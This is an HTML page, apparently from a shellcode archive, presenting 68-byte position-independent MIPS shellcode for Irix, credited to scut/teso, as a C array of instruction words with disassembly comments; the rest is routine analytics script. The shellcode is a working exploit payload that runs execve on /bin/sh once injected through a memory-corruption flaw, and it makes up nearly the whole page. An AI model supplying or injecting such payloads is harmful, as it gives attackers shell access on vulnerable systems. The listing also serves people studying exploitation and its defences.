<html><head><title>Irix - execve(/bin/sh) - 68 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 68 byte MIPS/Irix PIC execve shellcode. -scut/teso
 */
unsigned long int shellcode[] = {
                0xafa0fffc,     /* sw           $zero, -4($sp)          */
                0x24067350,     /* li           $a2, 0x7350             */
/* dpatch: */   0x04d0ffff,     /* bltzal       $a2, dpatch             */
                0x8fa6fffc,     /* lw           $a2, -4($sp)            */
                /* a2 = (char **) envp = NULL */

                0x240fffcb,     /* li           $t7, -53                */
                0x01e07827,     /* nor          $t7, $t7, $zero         */
                0x03eff821,     /* addu         $ra, $ra, $t7           */

                /* a0 = (char *) pathname */
                0x23e4fff8,     /* addi         $a0, $ra, -8            */

                /* fix 0x42 dummy byte in pathname to shell */
                0x8fedfffc,     /* lw           $t5, -4($ra)            */
                0x25adffbe,     /* addiu        $t5, $t5, -66           */
                0xafedfffc,     /* sw           $t5, -4($ra)            */

                /* a1 = (char **) argv */
                0xafa4fff8,     /* sw           $a0, -8($sp)            */
                0x27a5fff8,     /* addiu        $a1, $sp, -8            */

                0x24020423,     /* li           $v0, 1059 (SYS_execve)  */
                0x0101010c,     /* syscall                              */
                0x2f62696e,     /* .ascii       &quot;/bin&quot;                  */
                0x2f736842,     /* .ascii       &quot;/sh&quot;, .byte 0xdummy    */


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
